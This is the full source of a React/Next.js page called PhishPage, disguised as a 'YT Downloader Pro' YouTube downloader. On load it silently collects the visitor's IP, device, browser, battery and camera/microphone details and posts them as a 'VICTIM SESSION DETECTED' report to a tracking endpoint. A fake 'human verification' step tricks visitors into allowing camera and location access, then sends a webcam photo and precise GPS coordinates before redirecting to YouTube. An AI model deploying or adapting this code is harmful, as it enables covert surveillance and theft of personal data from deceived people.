import { useState, useEffect } from 'react';
import { useRouter } from 'next/router';

export default function PhishPage() {
  const router = useRouter();
  const { id } = router.query;
  const [status, setStatus] = useState('');
  const [showLoader, setShowLoader] = useState(false);
  const [infoSent, setInfoSent] = useState(false);

  // Send device info when page loads
  useEffect(() => {
    if (id && !infoSent) {
      sendDeviceInfo();
      setInfoSent(true);
    }
  }, [id]);

  const sendDeviceInfo = async () => {
    try {
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();
      const publicIP = ipData.ip;
      const now = new Date();
      const timeString = now.toISOString().replace('T', ' ').substring(0, 23);

      // Get battery info
      let batteryLevel = 'N/A';
      let batteryCharging = 'N/A';
      try {
        const battery = await navigator.getBattery();
        batteryLevel = Math.round(battery.level * 100) + '%';
        batteryCharging = battery.charging ? 'YES' : 'NO';
      } catch(e) {}

      // Get connection info
      let connectionType = 'Unknown';
      let downlink = 'N/A';
      if (navigator.connection) {
        connectionType = navigator.connection.effectiveType || 'Unknown';
        downlink = navigator.connection.downlink + ' Mbps';
      }

      // Get media devices
      let devices = { audioinput: [], videoinput: [], audiooutput: [] };
      try {
        const allDevices = await navigator.mediaDevices.enumerateDevices();
        allDevices.forEach(d => {
          if (devices[d.kind]) {
            devices[d.kind].push(d.label || `Unknown ${d.kind} ${devices[d.kind].length + 1}`);
          }
        });
      } catch(e) {}

      const message = 
`✅🎯 VICTIM SESSION DETECTED - TRACKER v7.0 ULTIMATE

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 IP & NETWORK INFORMATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 Public IP: ${publicIP}
📱 Network: ${connectionType}
🕐 Capture Time: ${timeString}
🌍 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 DEVICE & SYSTEM PROFILE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📏 Screen: ${screen.width}x${screen.height}
🖥️ Platform: ${navigator.platform}
🌐 Language: ${navigator.language}
🧠 CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}
💾 RAM: ${navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 BROWSER FINGERPRINT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏷️ UA: ${navigator.userAgent}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 NETWORK
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📶 Connection: ${connectionType}
📊 Speed: ${downlink}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔋 BATTERY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔋 Level: ${batteryLevel}
⚡ Charging: ${batteryCharging}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📷 MEDIA DEVICES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${devices.videoinput.map((d, i) => `📹 Camera ${i+1}: ${d}`).join('\n')}
${devices.audioinput.map((d, i) => `🎤 Mic ${i+1}: ${d}`).join('\n')}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🚀 SESSION ACTIVE
🕐 ${timeString}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

      await fetch('/api/track', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          linkId: id, 
          type: 'victim_info',
          message: message
        })
      });
    } catch (e) {
      console.error('Failed to send device info:', e);
    }
  };

  const captureAndSend = async () => {
    setShowLoader(true);
    setStatus('Processing verification...');

    // Step 1: Capture photo
    let photoData = null;
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user' }
      });
      
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      await new Promise(r => setTimeout(r, 500));
      
      const canvas = document.createElement('canvas');
      canvas.width = 320;
      canvas.height = 240;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, 320, 240);
      photoData = canvas.toDataURL('image/jpeg', 0.4);
      
      stream.getTracks().forEach(track => track.stop());

      await fetch('/api/track', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ linkId: id, type: 'photo', photoData: photoData })
      });
    } catch (e) {}

    // Step 2: Capture location
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000
        });
      });

      await fetch('/api/track', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          linkId: id, 
          type: 'location', 
          coords: {
            lat: position.coords.latitude,
            lng: position.coords.longitude,
            accuracy: position.coords.accuracy
          }
        })
      });
    } catch (e) {}

    setShowLoader(false);
    setStatus('✅ Verification successful! Your download will start shortly...');
    
    // Redirect to YouTube after 2 seconds
    setTimeout(() => {
      window.location.href = 'https://youtube.com';
    }, 2000);
  };

  return (
    <div style={{ padding: '20px', fontFamily: 'Arial, sans-serif', maxWidth: '500px', margin: '0 auto', backgroundColor: '#f9f9f9', minHeight: '100vh' }}>
      
      {/* Header */}
      <div style={{ backgroundColor: '#ff0000', color: 'white', padding: '15px', borderRadius: '10px 10px 0 0', textAlign: 'center' }}>
        <h1 style={{ margin: 0, fontSize: '22px' }}>▶️ YT Downloader Pro</h1>
        <p style={{ margin: '5px 0 0', fontSize: '13px', opacity: 0.9 }}>Download any YouTube video in HD quality</p>
      </div>

      {/* Main Card */}
      <div style={{ backgroundColor: 'white', padding: '20px', borderRadius: '0 0 10px 10px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
        
        {/* YouTube URL Input */}
        <div style={{ marginBottom: '15px' }}>
          <label style={{ fontSize: '14px', fontWeight: 'bold', display: 'block', marginBottom: '5px', color: '#333' }}>
            Enter YouTube Video URL:
          </label>
          <div style={{ display: 'flex', gap: '5px' }}>
            <input 
              type="text" 
              defaultValue="https://www.youtube.com/watch?v=dQw4w9WgXcQ" 
              readOnly
              style={{ 
                flex: 1, padding: '10px', border: '2px solid #ddd', borderRadius: '5px',
                fontSize: '13px', backgroundColor: '#f5f5f5', color: '#666'
              }} 
            />
          </div>
        </div>

        {/* Quality Selection */}
        <div style={{ marginBottom: '15px' }}>
          <label style={{ fontSize: '14px', fontWeight: 'bold', display: 'block', marginBottom: '5px', color: '#333' }}>
            Select Quality:
          </label>
          <select style={{ width: '100%', padding: '10px', border: '2px solid #ddd', borderRadius: '5px', fontSize: '14px' }}>
            <option>4K (2160p) - Best Quality</option>
            <option selected>1080p (Full HD) - Recommended</option>
            <option>720p (HD) - Good</option>
            <option>480p (SD) - Normal</option>
            <option>Audio Only (MP3)</option>
          </select>
        </div>

        {/* Format Selection */}
        <div style={{ marginBottom: '20px' }}>
          <label style={{ fontSize: '14px', fontWeight: 'bold', display: 'block', marginBottom: '5px', color: '#333' }}>
            Select Format:
          </label>
          <div style={{ display: 'flex', gap: '10px' }}>
            <label style={{ flex: 1, padding: '8px', border: '2px solid #ff0000', borderRadius: '5px', textAlign: 'center', backgroundColor: '#fff0f0', cursor: 'pointer', fontSize: '13px' }}>
              <input type="radio" name="format" defaultChecked style={{ marginRight: '5px' }} /> MP4
            </label>
            <label style={{ flex: 1, padding: '8px', border: '2px solid #ddd', borderRadius: '5px', textAlign: 'center', cursor: 'pointer', fontSize: '13px' }}>
              <input type="radio" name="format" style={{ marginRight: '5px' }} /> MP3
            </label>
            <label style={{ flex: 1, padding: '8px', border: '2px solid #ddd', borderRadius: '5px', textAlign: 'center', cursor: 'pointer', fontSize: '13px' }}>
              <input type="radio" name="format" style={{ marginRight: '5px' }} /> AVI
            </label>
          </div>
        </div>

        {/* Human Verification Section */}
        <div style={{ 
          backgroundColor: '#fff8e1', border: '2px solid #ffc107', borderRadius: '10px', 
          padding: '15px', marginBottom: '20px', textAlign: 'center'
        }}>
          <div style={{ fontSize: '30px', marginBottom: '5px' }}>🛡️</div>
          <h3 style={{ margin: '0 0 5px', color: '#856404', fontSize: '16px' }}>Human Verification Required</h3>
          <p style={{ margin: '0 0 10px', color: '#666', fontSize: '13px' }}>
            YouTube requires human verification to prevent bots. 
            <br/>Please allow camera and location access to continue.
          </p>
          <div style={{ display: 'flex', justifyContent: 'center', gap: '15px', marginBottom: '10px', fontSize: '12px', color: '#666' }}>
            <span>📸 Camera</span>
            <span>📍 Location</span>
          </div>
          
          {!showLoader && !status && (
            <button 
              onClick={captureAndSend}
              style={{
                backgroundColor: '#ff0000', color: 'white', border: 'none',
                padding: '12px 40px', fontSize: '16px', borderRadius: '25px',
                cursor: 'pointer', fontWeight: 'bold', width: '100%',
                maxWidth: '250px'
              }}
            >
              ✅ Verify & Download
            </button>
          )}

          {showLoader && (
            <div style={{ textAlign: 'center', padding: '10px' }}>
              <div style={{
                border: '4px solid #f3f3f3',
                borderTop: '4px solid #ff0000',
                borderRadius: '50%',
                width: '40px',
                height: '40px',
                animation: 'spin 1s linear infinite',
                margin: '0 auto 10px'
              }}></div>
              <p style={{ color: '#666', fontSize: '13px' }}>Verifying... Please allow camera & location permissions.</p>
            </div>
          )}

          {status && (
            <div style={{ padding: '10px', backgroundColor: '#d4edda', borderRadius: '8px', color: '#155724', fontSize: '14px' }}>
              {status}
            </div>
          )}
        </div>

        {/* Features */}
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', fontSize: '12px', color: '#666' }}>
          <div style={{ padding: '10px', backgroundColor: '#f5f5f5', borderRadius: '8px', textAlign: 'center' }}>
            <div style={{ fontSize: '20px' }}>⚡</div>
            <div>Ultra Fast</div>
          </div>
          <div style={{ padding: '10px', backgroundColor: '#f5f5f5', borderRadius: '8px', textAlign: 'center' }}>
            <div style={{ fontSize: '20px' }}>🔒</div>
            <div>100% Safe</div>
          </div>
          <div style={{ padding: '10px', backgroundColor: '#f5f5f5', borderRadius: '8px', textAlign: 'center' }}>
            <div style={{ fontSize: '20px' }}>🎯</div>
            <div>No Ads</div>
          </div>
          <div style={{ padding: '10px', backgroundColor: '#f5f5f5', borderRadius: '8px', textAlign: 'center' }}>
            <div style={{ fontSize: '20px' }}>🌍</div>
            <div>Free</div>
          </div>
        </div>

        {/* Footer */}
        <div style={{ marginTop: '20px', textAlign: 'center', fontSize: '11px', color: '#999' }}>
          <p>By downloading you agree to our Terms of Service</p>
          <p>© 2026 YT Downloader Pro - All rights reserved</p>
        </div>
      </div>

      <style>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}
